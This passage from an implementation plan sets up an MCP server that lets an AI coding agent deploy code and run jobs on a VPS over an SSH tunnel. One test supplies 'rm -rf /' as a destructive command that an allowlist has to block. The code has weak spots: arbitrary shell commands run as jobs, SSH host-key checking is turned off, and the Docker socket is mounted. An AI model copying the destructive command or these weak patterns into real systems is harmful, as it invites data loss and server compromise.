    claude_md: `# Project\n## Deployment\n\`\`\`bash\ngit pull origin develop\ndocker build -t app .\ndocker stop app && docker rm app\ndocker run -d --name app app\n\`\`\``,
    operation: "full",
  };

  it("parses CLAUDE.md and executes deploy commands", async () => {
    const result = await handleDeploy(baseRequest);
    expect(result.success).toBe(true);
    expect(result.data?.final_status).toBe("success");
  });

  it("returns error when no deploy instructions found", async () => {
    const result = await handleDeploy({ ...baseRequest, claude_md: "# No deploy section here" });
    expect(result.success).toBe(false);
    expect(result.error).toContain("No deployment");
  });

  it("rejects commands that fail allowlist validation", async () => {
    const evilMd = "# Deploy\n## Deployment\n```bash\nrm -rf /\n```";
    const result = await handleDeploy({ ...baseRequest, claude_md: evilMd });
    expect(result.success).toBe(false);
    expect(result.error).toContain("blocked");
  });

  it("uses working_directory override when provided", async () => {
    const result = await handleDeploy({ ...baseRequest, working_directory: "/custom/path" });
    expect(result.success).toBe(true);
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd vps-agent && npx vitest run tests/handlers/deploy.test.ts`
Expected: FAIL

- [ ] **Step 3: Implement deploy handler**

```typescript
// vps-agent/src/handlers/deploy.ts
import { parseDeployInstructions } from "../claude-md-parser.js";
import { validateCommand } from "../allowlist.js";
import { executeSequence } from "../executor.js";
import type { DeployRequest, AgentResponse, DeployResult } from "../../../shared/types.js";

export async function handleDeploy(req: DeployRequest): Promise<AgentResponse<DeployResult>> {
  // 1. Parse CLAUDE.md for deploy instructions
  const parsed = parseDeployInstructions(req.claude_md, req.operation);

  if (parsed.error || parsed.commands.length === 0) {
    return { success: false, error: parsed.error || "No deployment commands found" };
  }

  // 2. Validate every command against the allowlist
  for (const cmd of parsed.commands) {
    const validation = validateCommand(cmd);
    if (!validation.valid) {
      return {
        success: false,
        error: `Command blocked by allowlist: "${cmd}" — ${validation.reason}`,
      };
    }
  }

  // 3. Determine working directory
  const cwd = req.working_directory || parsed.working_directory || process.env.WORKSPACE_DIR || "/local/data/scrath/docker-data";

  // 4. Execute the command sequence
  const result = await executeSequence(parsed.commands, { cwd });

  return {
    success: result.final_status === "success",
    data: result,
    error: result.final_status === "failed" ? `Deploy failed at step ${result.failed_step?.index}: ${result.failed_step?.command}` : undefined,
    logs: result.logs,
    duration_ms: result.logs.length, // placeholder, real timing comes from executor
  };
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd vps-agent && npx vitest run tests/handlers/deploy.test.ts`
Expected: All PASS

- [ ] **Step 5: Commit**

```bash
git add vps-agent/src/handlers/deploy.ts vps-agent/tests/handlers/deploy.test.ts
git commit -m "feat(vps-agent): add context-aware deploy handler"
```

---

### Task 8: VPS Agent — Jobs Handler

**Files:**
- Create: `vps-agent/src/handlers/jobs.ts`
- Create: `vps-agent/tests/handlers/jobs.test.ts`

- [ ] **Step 1: Write failing tests**

```typescript
// vps-agent/tests/handlers/jobs.test.ts
import { describe, it, expect, vi } from "vitest";
import { handleRunJob } from "../../src/handlers/jobs.js";
import type { RunJobRequest } from "../../../shared/types.js";

vi.mock("../../src/executor.js", () => ({
  executeCommand: vi.fn(async (cmd: string) => ({
    success: true,
    stdout: `Job output for: ${cmd}`,
    stderr: "",
    duration_ms: 100,
  })),
}));

vi.mock("../../src/allowlist.js", () => ({
  validateCommand: vi.fn(() => ({ valid: true })),
}));

describe("jobs handler", () => {
  it("runs a named job from CLAUDE.md", async () => {
    const req: RunJobRequest = {
      repo_url: "https://github.com/user/repo",
      branch: "develop",
      claude_md: "# Project\n## Jobs\n### e2e\n```bash\nbash /workspace/run_e2e.sh company1:id1\n```",
      job_name: "e2e",
      job_args: ["company1:id1"],
    };
    const result = await handleRunJob(req);
    expect(result.success).toBe(true);
  });

  it("runs a direct job command when no CLAUDE.md job section matches", async () => {
    const req: RunJobRequest = {
      repo_url: "https://github.com/user/repo",
      branch: "develop",
      claude_md: "# No jobs section",
      job_name: "bash /workspace/run_e2e.sh test:123",
    };
    const result = await handleRunJob(req);
    expect(result.success).toBe(true);
  });

  it("returns error for empty job_name", async () => {
    const req: RunJobRequest = {
      repo_url: "https://github.com/user/repo",
      branch: "develop",
      claude_md: "# Test",
      job_name: "",
    };
    const result = await handleRunJob(req);
    expect(result.success).toBe(false);
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd vps-agent && npx vitest run tests/handlers/jobs.test.ts`
Expected: FAIL

- [ ] **Step 3: Implement jobs handler**

```typescript
// vps-agent/src/handlers/jobs.ts
import { executeCommand } from "../executor.js";
import { validateCommand } from "../allowlist.js";
import type { RunJobRequest, AgentResponse } from "../../../shared/types.js";

/**
 * Parse job commands from CLAUDE.md. Looks for sections like:
 * ## Jobs / ## Scheduled Jobs / ## Make Targets
 * ### job_name
 * ```bash
 * command here
 * ```
 */
function findJobCommand(claudeMd: string, jobName: string, jobArgs?: string[]): string | null {
  // Look for a heading matching the job name
  const headingPattern = new RegExp(
    `^#{1,4}\\s+.*${jobName.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}.*$`,
    "im"
  );
  const match = claudeMd.match(headingPattern);

  if (match && match.index !== undefined) {
    // Find the next code block after this heading
    const afterHeading = claudeMd.slice(match.index);
    const codeBlock = afterHeading.match(/```bash\n([\s\S]*?)```/);
    if (codeBlock) {
      let cmd = codeBlock[1].split("\n").filter((l) => l.trim() && !l.trim().startsWith("#")).join(" && ");
      if (jobArgs && jobArgs.length > 0) {
        cmd += " " + jobArgs.join(" ");
      }
      return cmd;
    }
  }

  return null;
}

export async function handleRunJob(req: RunJobRequest): Promise<AgentResponse<string>> {
  if (!req.job_name) {
    return { success: false, error: "job_name is required" };
  }

  // Try to find the job in CLAUDE.md first
  let command = findJobCommand(req.claude_md, req.job_name, req.job_args);

  // If not found in CLAUDE.md, treat job_name as a direct command
  if (!command) {
    command = req.job_args ? `${req.job_name} ${req.job_args.join(" ")}` : req.job_name;
  }

  // Validate
  const validation = validateCommand(command);
  if (!validation.valid) {
    return { success: false, error: `Command blocked: ${validation.reason}` };
  }

  // Execute with longer timeout (jobs can take a while)
  const cwd = process.env.WORKSPACE_DIR || "/local/data/scrath/docker-data";
  const result = await executeCommand(command, { cwd, timeout_ms: 600_000 });

  return {
    success: result.success,
    data: result.stdout + (result.stderr ? `\nSTDERR: ${result.stderr}` : ""),
    error: result.success ? undefined : result.error,
    duration_ms: result.duration_ms,
  };
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd vps-agent && npx vitest run tests/handlers/jobs.test.ts`
Expected: All PASS

- [ ] **Step 5: Commit**

```bash
git add vps-agent/src/handlers/jobs.ts vps-agent/tests/handlers/jobs.test.ts
git commit -m "feat(vps-agent): add job execution handler"
```

---

### Task 9: VPS Agent — Express Server Entry

**Files:**
- Create: `vps-agent/src/index.ts`

- [ ] **Step 1: Implement Express server**

```typescript
// vps-agent/src/index.ts
import express from "express";
import { authMiddleware } from "./auth.js";
import { handleDeploy } from "./handlers/deploy.js";
import { handleRunJob } from "./handlers/jobs.js";
import {
  handleDockerStatus,
  handleDockerLogs,
  handleDiskUsage,
  handleGitStatus,
  handleServiceHealth,
} from "./handlers/query.js";

const app = express();
app.use(express.json({ limit: "5mb" })); // CLAUDE.md can be large

// Health check (no auth required)
app.get("/health", (_req, res) => {
  res.json({ status: "ok", timestamp: new Date().toISOString() });
});

// All other routes require auth
app.use(authMiddleware);

// Deploy
app.post("/deploy", async (req, res) => {
  try {
    const result = await handleDeploy(req.body);
    res.status(result.success ? 200 : 400).json(result);
  } catch (err: any) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// Run Job
app.post("/run-job", async (req, res) => {
  try {
    const result = await handleRunJob(req.body);
    res.status(result.success ? 200 : 400).json(result);
  } catch (err: any) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// Query endpoints
app.get("/docker-status", async (_req, res) => {
  const result = await handleDockerStatus();
  res.json(result);
});

app.get("/docker-logs/:container", async (req, res) => {
  const lines = parseInt(req.query.lines as string) || 100;
  const result = await handleDockerLogs(req.params.container, lines);
  res.json(result);
});

app.get("/disk-usage", async (_req, res) => {
  const result = await handleDiskUsage();
  res.json(result);
});

app.get("/git-status", async (req, res) => {
  const result = await handleGitStatus(req.query.working_directory as string);
  res.json(result);
});

app.get("/service-health", async (req, res) => {
  const urls = req.query.urls ? (req.query.urls as string).split(",") : undefined;
  const result = await handleServiceHealth(urls);
  res.json(result);
});

app.get("/db-health", async (_req, res) => {
  // Simple check: try to reach Neo4j and Postgres via curl/docker exec
  const neo4j = await import("./executor.js").then((e) =>
    e.executeCommand("curl -s -o /dev/null -w '%{http_code}' http://neo4j:7474", { timeout_ms: 5000 })
  );
  const pg = await import("./executor.js").then((e) =>
    e.executeCommand("docker exec docker-data-postgres-1 pg_isready", { timeout_ms: 5000 })
  );

  res.json({
    success: true,
    data: {
      neo4j: { connected: neo4j.stdout.trim() === "200", raw: neo4j.stdout.trim() },
      postgres: { connected: pg.success, raw: pg.stdout.trim() },
    },
  });
});

const PORT = parseInt(process.env.VPS_AGENT_PORT || "7847");
app.listen(PORT, "127.0.0.1", () => {
  console.log(`VPS Agent listening on 127.0.0.1:${PORT}`);
});
```

- [ ] **Step 2: Verify it compiles**

Run: `cd vps-agent && npx tsc --noEmit`
Expected: No errors

- [ ] **Step 3: Commit**

```bash
git add vps-agent/src/index.ts
git commit -m "feat(vps-agent): add Express server with all routes"
```

---

### Task 10: VPS Agent — Dockerfile

**Files:**
- Create: `vps-agent/Dockerfile`

- [ ] **Step 1: Create Dockerfile**

```dockerfile
FROM node:20-alpine

# Install curl for health checks, docker CLI for docker commands
RUN apk add --no-cache curl docker-cli git bash

WORKDIR /app

COPY package*.json ./
RUN npm ci --production

COPY dist/ ./dist/
COPY ../shared/ ./shared/

EXPOSE 7847

HEALTHCHECK --interval=30s --timeout=3s \
  CMD curl -f http://127.0.0.1:7847/health || exit 1

CMD ["node", "dist/index.js"]
```

- [ ] **Step 2: Create a build script for VPS agent**

`vps-agent/build.sh`:
```bash
#!/bin/bash
set -e
echo "Building VPS agent..."
cd "$(dirname "$0")"
npm run build
echo "Build complete. dist/ ready for Docker."
```

- [ ] **Step 3: Commit**

```bash
git add vps-agent/Dockerfile vps-agent/build.sh
chmod +x vps-agent/build.sh
git commit -m "feat(vps-agent): add Dockerfile and build script"
```

---

### Task 11: Local MCP Proxy — SSH Tunnel Manager

**Files:**
- Create: `local/src/tunnel.ts`
- Create: `local/tests/tunnel.test.ts`

- [ ] **Step 1: Write failing tests**

```typescript
// local/tests/tunnel.test.ts
import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import { TunnelManager } from "../src/tunnel.js";
import { EventEmitter } from "node:events";

// Mock child_process
const mockProcess = Object.assign(new EventEmitter(), {
  pid: 1234,
  kill: vi.fn(),
  stdin: null,
  stdout: new EventEmitter(),
  stderr: new EventEmitter(),
});

vi.mock("node:child_process", () => ({
  spawn: vi.fn(() => mockProcess),
}));

vi.mock("node:net", () => ({
  createConnection: vi.fn((_opts: any, cb: () => void) => {
    const socket = Object.assign(new EventEmitter(), { destroy: vi.fn(), end: vi.fn() });
    setTimeout(cb, 10);
    return socket;
  }),
}));

describe("TunnelManager", () => {
  let tunnel: TunnelManager;

  beforeEach(() => {
    tunnel = new TunnelManager({
      host: "187.77.185.22",
      user: "syamiq",
      keyPath: "~/.ssh/id_ed25519",
      localPort: 7847,
      remotePort: 7847,
    });
  });

  afterEach(() => {
    tunnel.close();
  });

  it("spawns SSH process on connect", async () => {
    const { spawn } = await import("node:child_process");
    await tunnel.connect();
    expect(spawn).toHaveBeenCalledWith(
      "ssh",
      expect.arrayContaining(["-N", "-L"]),
      expect.any(Object)
    );
  });

  it("isAlive returns true when tunnel is connected", async () => {
    await tunnel.connect();
    const alive = await tunnel.isAlive();
    expect(alive).toBe(true);
  });

  it("close kills the SSH process", async () => {
    await tunnel.connect();
    tunnel.close();
    expect(mockProcess.kill).toHaveBeenCalled();
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd local && npx vitest run tests/tunnel.test.ts`
Expected: FAIL

- [ ] **Step 3: Implement tunnel.ts**

```typescript
// local/src/tunnel.ts
import { spawn, type ChildProcess } from "node:child_process";
import { createConnection } from "node:net";

export interface TunnelConfig {
  host: string;
  user: string;
  keyPath: string;
  localPort: number;
  remotePort: number;
}

export class TunnelManager {
  private config: TunnelConfig;
  private process: ChildProcess | null = null;
  private retryCount = 0;
  private maxRetries = 3;

  constructor(config: TunnelConfig) {
    this.config = config;
  }

  async connect(): Promise<void> {
    if (this.process) return;

    const args = [
      "-N",
      "-L", `${this.config.localPort}:127.0.0.1:${this.config.remotePort}`,
      "-i", this.config.keyPath,
      "-o", "StrictHostKeyChecking=no",
      "-o", "ServerAliveInterval=30",
      "-o", "ServerAliveCountMax=3",
      "-o", "ExitOnForwardFailure=yes",
      `${this.config.user}@${this.config.host}`,
    ];

    this.process = spawn("ssh", args, { stdio: ["ignore", "pipe", "pipe"] });

    this.process.on("exit", (code) => {
      this.process = null;
      if (code !== 0 && this.retryCount < this.maxRetries) {
        this.retryCount++;
        const delay = Math.pow(2, this.retryCount) * 1000;
        setTimeout(() => this.connect(), delay);
      }
    });

    // Wait a moment for the tunnel to establish
    await new Promise((resolve) => setTimeout(resolve, 500));
  }

  async isAlive(): Promise<boolean> {
    return new Promise((resolve) => {
      const socket = createConnection(
        { host: "127.0.0.1", port: this.config.localPort },
        () => {
          socket.destroy();
          resolve(true);
        }
      );
      socket.on("error", () => resolve(false));
      socket.setTimeout(2000, () => {
        socket.destroy();
        resolve(false);
      });
    });
  }

  async ensureConnected(): Promise<void> {
    const alive = await this.isAlive();
    if (!alive) {
      this.close();
      this.retryCount = 0;
      await this.connect();
      // Verify it's actually up
      const aliveAfterReconnect = await this.isAlive();
      if (!aliveAfterReconnect) {
        throw new Error("SSH tunnel failed to establish after reconnect");
      }
    }
  }

  close(): void {
    if (this.process) {
      this.process.kill();
      this.process = null;
    }
  }
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd local && npx vitest run tests/tunnel.test.ts`
Expected: All PASS

- [ ] **Step 5: Commit**

```bash
git add local/src/tunnel.ts local/tests/tunnel.test.ts
git commit -m "feat(local): add SSH tunnel manager with auto-reconnect"
```

---

### Task 12: Local MCP Proxy — HTTP Proxy Client

**Files:**
- Create: `local/src/proxy.ts`
- Create: `local/tests/proxy.test.ts`

- [ ] **Step 1: Write failing tests**

```typescript
// local/tests/proxy.test.ts
import { describe, it, expect, vi, beforeEach } from "vitest";
import { VpsProxy } from "../src/proxy.js";

// Mock global fetch
const mockFetch = vi.fn();
global.fetch = mockFetch;

describe("VpsProxy", () => {
  let proxy: VpsProxy;

  beforeEach(() => {
    proxy = new VpsProxy({ port: 7847, authToken: "test-token" });
    mockFetch.mockReset();
  });

  it("sends POST request with auth header for deploy", async () => {
    mockFetch.mockResolvedValue({
      ok: true,
      json: async () => ({ success: true, data: { final_status: "success" } }),
    });

    const result = await proxy.post("/deploy", { repo_url: "x", branch: "main", claude_md: "# Y", operation: "full" });
    expect(result.success).toBe(true);
    expect(mockFetch).toHaveBeenCalledWith(
      "http://127.0.0.1:7847/deploy",
      expect.objectContaining({
        method: "POST",
        headers: expect.objectContaining({ Authorization: "Bearer test-token" }),
      })
    );
  });

  it("sends GET request for query endpoints", async () => {
    mockFetch.mockResolvedValue({
      ok: true,
      json: async () => ({ success: true, data: "container list" }),
    });

    const result = await proxy.get("/docker-status");
    expect(result.success).toBe(true);
  });

  it("returns error when fetch fails", async () => {
    mockFetch.mockRejectedValue(new Error("Connection refused"));

    const result = await proxy.get("/docker-status");
    expect(result.success).toBe(false);
    expect(result.error).toContain("Connection refused");
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd local && npx vitest run tests/proxy.test.ts`
Expected: FAIL

- [ ] **Step 3: Implement proxy.ts**

```typescript
// local/src/proxy.ts
import type { AgentResponse } from "../../shared/types.js";

export interface ProxyConfig {
  port: number;
  authToken: string;
}

export class VpsProxy {
  private baseUrl: string;
  private authToken: string;

  constructor(config: ProxyConfig) {
    this.baseUrl = `http://127.0.0.1:${config.port}`;
    this.authToken = config.authToken;
  }

  async post<T = unknown>(path: string, body: unknown): Promise<AgentResponse<T>> {
    try {
      const response = await fetch(`${this.baseUrl}${path}`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${this.authToken}`,
        },
        body: JSON.stringify(body),
        signal: AbortSignal.timeout(path === "/deploy" ? 300_000 : 30_000),
      });

      return await response.json() as AgentResponse<T>;
    } catch (err: any) {
      return { success: false, error: err.message };
    }
  }

  async get<T = unknown>(path: string, query?: Record<string, string>): Promise<AgentResponse<T>> {
    try {
      const url = new URL(`${this.baseUrl}${path}`);
      if (query) {
        Object.entries(query).forEach(([k, v]) => url.searchParams.set(k, v));
      }

      const response = await fetch(url.toString(), {
        headers: { Authorization: `Bearer ${this.authToken}` },
        signal: AbortSignal.timeout(30_000),
      });

      return await response.json() as AgentResponse<T>;
    } catch (err: any) {
      return { success: false, error: err.message };
    }
  }
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd local && npx vitest run tests/proxy.test.ts`
Expected: All PASS

- [ ] **Step 5: Commit**

```bash
git add local/src/proxy.ts local/tests/proxy.test.ts
git commit -m "feat(local): add HTTP proxy client for VPS agent"
```

---

### Task 13: Local MCP Proxy — Tool Definitions

**Files:**
- Create: `local/src/tools.ts`

- [ ] **Step 1: Implement MCP tool definitions**

```typescript
// local/src/tools.ts
import type { Tool } from "@modelcontextprotocol/sdk/types.js";

export const TOOLS: Tool[] = [
  {
    name: "deploy",
    description: "Deploy code to VPS. Parses CLAUDE.md from your project for deploy instructions and executes them on the VPS. Provide your repo URL, branch, CLAUDE.md content, and which operation to run (frontend/backend/full).",
    inputSchema: {
      type: "object",
      properties: {
        repo_url: { type: "string", description: "GitHub repo URL being deployed" },
        branch: { type: "string", description: "Branch to deploy" },
        claude_md: { type: "string", description: "Contents of the project CLAUDE.md (or relevant deploy sections)" },
        operation: { type: "string", enum: ["frontend", "backend", "full", "custom"], description: "What to deploy" },
        working_directory: { type: "string", description: "Override VPS working directory (default: /local/data/scrath/docker-data)" },
      },
      required: ["repo_url", "branch", "claude_md", "operation"],
    },
  },
  {
    name: "run_job",
    description: "Run a named job on the VPS. Looks for the job in CLAUDE.md (under Jobs/Scheduled Jobs/Make Targets sections), or treats job_name as a direct command if not found.",
    inputSchema: {
      type: "object",
      properties: {
        repo_url: { type: "string", description: "GitHub repo URL" },
        branch: { type: "string", description: "Current branch" },
        claude_md: { type: "string", description: "Contents of the project CLAUDE.md" },
        job_name: { type: "string", description: "Job name (matches heading in CLAUDE.md) or direct command" },
        job_args: { type: "array", items: { type: "string" }, description: "Additional arguments for the job" },
      },
      required: ["repo_url", "branch", "claude_md", "job_name"],
    },
  },
  {
    name: "docker_status",
    description: "Get status of all Docker containers running on the VPS.",
    inputSchema: { type: "object", properties: {} },
  },
  {
    name: "docker_logs",
    description: "Get logs from a specific Docker container on the VPS.",
    inputSchema: {
      type: "object",
      properties: {
        container: { type: "string", description: "Container name (e.g., docker-data-frontend-1)" },
        lines: { type: "number", description: "Number of log lines to return (default: 100)" },
      },
      required: ["container"],
    },
  },
  {
    name: "disk_usage",
    description: "Get disk usage information from the VPS (filesystem + top directories).",
    inputSchema: { type: "object", properties: {} },
  },
  {
    name: "db_health",
    description: "Check Neo4j and PostgreSQL health on the VPS.",
    inputSchema: { type: "object", properties: {} },
  },
  {
    name: "git_status",
    description: "Get git status on the VPS (current branch, HEAD sha, uncommitted changes).",
    inputSchema: {
      type: "object",
      properties: {
        working_directory: { type: "string", description: "Override working directory on VPS" },
      },
    },
  },
  {
    name: "service_health",
    description: "HTTP health check on VPS services (frontend, API, custom URLs).",
    inputSchema: {
      type: "object",
      properties: {
        urls: { type: "array", items: { type: "string" }, description: "URLs to check (default: localhost:3000 + localhost:8000/health)" },
      },
    },
  },
];
```

- [ ] **Step 2: Commit**

```bash
git add local/src/tools.ts
git commit -m "feat(local): add MCP tool definitions for all VPS operations"
```

---

### Task 14: Local MCP Proxy — MCP Server Entry

**Files:**
- Create: `local/src/index.ts`

- [ ] **Step 1: Implement MCP server**

```typescript
// local/src/index.ts
import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";
import { StdioServerTransport } from "@modelcontextprotocol/sdk/server/stdio.js";
import { TunnelManager } from "./tunnel.js";
import { VpsProxy } from "./proxy.js";
import { TOOLS } from "./tools.js";

const config = {
  host: process.env.VPS_HOST || "187.77.185.22",
  user: process.env.VPS_USER || "syamiq",
  keyPath: process.env.SSH_KEY_PATH || "~/.ssh/id_ed25519",
  port: parseInt(process.env.VPS_AGENT_PORT || "7847"),
  authToken: process.env.VPS_AUTH_TOKEN || "",
};

if (!config.authToken) {
  console.error("VPS_AUTH_TOKEN environment variable is required");
  process.exit(1);
}

const tunnel = new TunnelManager({
  host: config.host,
  user: config.user,
  keyPath: config.keyPath,
  localPort: config.port,
  remotePort: config.port,
});

const proxy = new VpsProxy({ port: config.port, authToken: config.authToken });

const server = new McpServer({
  name: "vps-deployer",
  version: "1.0.0",
});

// Register all tools
for (const tool of TOOLS) {
  server.tool(tool.name, tool.description || "", tool.inputSchema.properties || {}, async (args) => {
    // Ensure tunnel is up
    try {
      await tunnel.ensureConnected();
    } catch (err: any) {
      return { content: [{ type: "text", text: `VPS unreachable — SSH tunnel failed: ${err.message}` }], isError: true };
    }

    // Route to appropriate endpoint
    let result;
    switch (tool.name) {
      case "deploy":
        result = await proxy.post("/deploy", args);
        break;
      case "run_job":
        result = await proxy.post("/run-job", args);
        break;
      case "docker_status":
        result = await proxy.get("/docker-status");
        break;
      case "docker_logs":
        result = await proxy.get(`/docker-logs/${(args as any).container}`, {
          lines: String((args as any).lines || 100),
        });
        break;
      case "disk_usage":
        result = await proxy.get("/disk-usage");
        break;
      case "db_health":
        result = await proxy.get("/db-health");
        break;
      case "git_status":
        result = await proxy.get("/git-status", (args as any).working_directory ? { working_directory: (args as any).working_directory } : undefined);
        break;
      case "service_health":
        result = await proxy.get("/service-health", (args as any).urls ? { urls: (args as any).urls.join(",") } : undefined);
        break;
      default:
        result = { success: false, error: `Unknown tool: ${tool.name}` };
    }

    const text = result.success
      ? JSON.stringify(result.data, null, 2)
      : `Error: ${result.error}`;

    return { content: [{ type: "text", text }], isError: !result.success };
  });
}

// Start server
async function main() {
  await tunnel.connect();
  const transport = new StdioServerTransport();
  await server.connect(transport);
}

main().catch((err) => {
  console.error("Failed to start VPS MCP proxy:", err);
  process.exit(1);
});

// Cleanup on exit
process.on("SIGINT", () => { tunnel.close(); process.exit(0); });
process.on("SIGTERM", () => { tunnel.close(); process.exit(0); });
```

- [ ] **Step 2: Verify it compiles**

Run: `cd local && npx tsc --noEmit`
Expected: No errors (or only path-related warnings for shared/)

- [ ] **Step 3: Commit**

```bash
git add local/src/index.ts
git commit -m "feat(local): add MCP server entry with stdio transport and tool routing"
```

---

### Task 15: Deploy Script + .env + README

**Files:**
- Create: `deploy-vps-agent.sh`
- Update: `README.md`

- [ ] **Step 1: Create deploy-vps-agent.sh**

```bash
#!/bin/bash
set -e

VPS_HOST="${VPS_HOST:-187.77.185.22}"
VPS_USER="${VPS_USER:-syamiq}"
REMOTE_DIR="/local/data/scrath/vps-agent"

echo "=== Building VPS Agent ==="
cd vps-agent
npm ci
npm run build
cd ..

echo "=== Copying files to VPS ==="
# Copy built dist + package files + Dockerfile + shared types
ssh ${VPS_USER}@${VPS_HOST} "sudo mkdir -p ${REMOTE_DIR}"
scp -r vps-agent/dist ${VPS_USER}@${VPS_HOST}:/tmp/vps-agent-dist
scp vps-agent/package.json vps-agent/package-lock.json ${VPS_USER}@${VPS_HOST}:/tmp/
scp vps-agent/Dockerfile ${VPS_USER}@${VPS_HOST}:/tmp/vps-agent-Dockerfile
scp -r shared ${VPS_USER}@${VPS_HOST}:/tmp/vps-agent-shared
scp .env ${VPS_USER}@${VPS_HOST}:/tmp/vps-agent-env

echo "=== Building Docker image on VPS ==="
ssh ${VPS_USER}@${VPS_HOST} << 'REMOTE'
sudo cp -r /tmp/vps-agent-dist ${REMOTE_DIR}/dist
sudo cp /tmp/package.json /tmp/package-lock.json ${REMOTE_DIR}/
sudo cp /tmp/vps-agent-Dockerfile ${REMOTE_DIR}/Dockerfile
sudo cp -r /tmp/vps-agent-shared ${REMOTE_DIR}/shared
sudo cp /tmp/vps-agent-env ${REMOTE_DIR}/.env

cd /local/data/scrath/vps-agent
sudo docker build -t vps-agent .
sudo docker stop vps-agent 2>/dev/null || true
sudo docker rm vps-agent 2>/dev/null || true
sudo docker run -d --name vps-agent --restart unless-stopped \
  -v /var/run/docker.sock:/var/run/docker.sock \
  -v /local/data/scrath/docker-data:/workspace \
  -p 127.0.0.1:7847:7847 \
  --env-file .env \
  vps-agent

echo "=== VPS Agent deployed ==="
sudo docker ps | grep vps-agent
REMOTE

echo "Done! VPS agent is running on 127.0.0.1:7847"
```

- [ ] **Step 2: Update README.md**

```markdown
# VPS MCP Deployer

An MCP server that lets any Claude Code conversation deploy code, run jobs, and query state on a VPS.

## Architecture

- **Local MCP Proxy** (`local/`) — stdio MCP server that Claude Code launches. Forwards tool calls over SSH-tunneled HTTP.
- **VPS Agent** (`vps-agent/`) — Express HTTP server running in Docker on the VPS. Executes allowlisted operations.

## Setup

### 1. Configure environment

```bash
cp .env.example .env
# Edit .env — set AUTH_TOKEN to a random string
```

### 2. Deploy VPS agent

```bash
chmod +x deploy-vps-agent.sh
./deploy-vps-agent.sh
```

### 3. Add to Claude Code

Add to your project's `.claude/settings.local.json`:

```json
{
  "mcpServers": {
    "vps-deployer": {
      "command": "npx",
      "args": ["tsx", "/path/to/vps_mcp_deployer/local/src/index.ts"],
      "env": {
        "VPS_AUTH_TOKEN": "your-token-from-.env",
        "VPS_HOST": "187.77.185.22",
        "VPS_USER": "syamiq",
        "SSH_KEY_PATH": "~/.ssh/id_ed25519"
      }
    }
  }
}
```

## Available Tools

| Tool | Description |
|------|-------------|
| `deploy` | Context-aware deploy using your CLAUDE.md instructions |
| `run_job` | Execute a named job from CLAUDE.md |
| `docker_status` | List all containers |
| `docker_logs` | Tail container logs |
| `disk_usage` | Check disk space |
| `db_health` | Neo4j + Postgres health |
| `git_status` | Branch, HEAD, changes on VPS |
| `service_health` | HTTP health checks |

## Development

```bash
cd local && npm install && npm test
cd vps-agent && npm install && npm test
```
```

- [ ] **Step 3: Commit**

```bash
chmod +x deploy-vps-agent.sh
git add deploy-vps-agent.sh README.md
git commit -m "docs: add deploy script and README with setup instructions"
```

---

### Task 16: Push to GitHub

- [ ] **Step 1: Push all commits to origin**

```bash
git push origin main
```

- [ ] **Step 2: Verify on GitHub**

Run: `gh repo view syedamber91/vps_mcp_deployer --web`
